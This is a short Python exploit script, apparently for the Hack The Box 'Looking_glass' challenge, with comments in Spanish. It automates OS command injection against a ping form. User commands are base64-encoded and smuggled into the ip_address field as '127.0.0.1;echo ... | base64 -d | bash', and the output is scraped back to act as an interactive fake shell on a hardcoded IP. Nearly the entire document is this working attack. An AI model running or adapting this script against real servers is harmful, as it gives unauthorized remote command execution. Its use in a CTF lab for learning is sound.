#!/usr/bin/python3
# coding: utf-8

# Reto de HTB Looking_glass del OWASP Top 10
# Procedemos a montar un Script para Automatizar el uso de la Vulnerabilidad OS Injection en este Reto
# Script by K0Hack ~ Ki-pr0

import signal
import requests
import sys
import pdb
import re
import time

from base64 import b64encode
from pwn import *

def cerrando(sig, frame):
	print("\n[*] Hasta Luego Primo\n")
	sys.exit(1)


# Ctrl + C
signal.signal(signal.SIGINT, cerrando)

# Variable Global
main_url = "http://178.62.44.230:31198/" 	# Servidor de Prueba - Introduce el Tullo Aqui 
# burp = {'http':'http://127.0.0.1:8080'}       # Encaso de querer tunelizar por Burpsuite

def execFakeShell():

#	print("[*] Introduce el servidor Glass a Pwnear --> http://IP:Port [*]")
#	ip = input()
#	main_url = ip
	p1 = log.progress("Rompiendo el Cristal ~ Pwned")

	while True:

		cmd = input('$~ ')
		cmd = cmd.encode()
		cmd = b64encode(cmd).decode()
		cmd = cmd.strip('\n')

		data = {

			'test': 'ping',
			'ip_address': '127.0.0.1;echo %s | base64 -d | bash' % cmd,
			'submit': 'Test'

		}

		r = requests.post(main_url, data=data) # proxies=burp)

		data = r.text
		data = data.split('ms\n')[-1]
		data = data.split('</textarea>')[0]
		print(data.strip())


if __name__ == '__main__':

	execFakeShell()
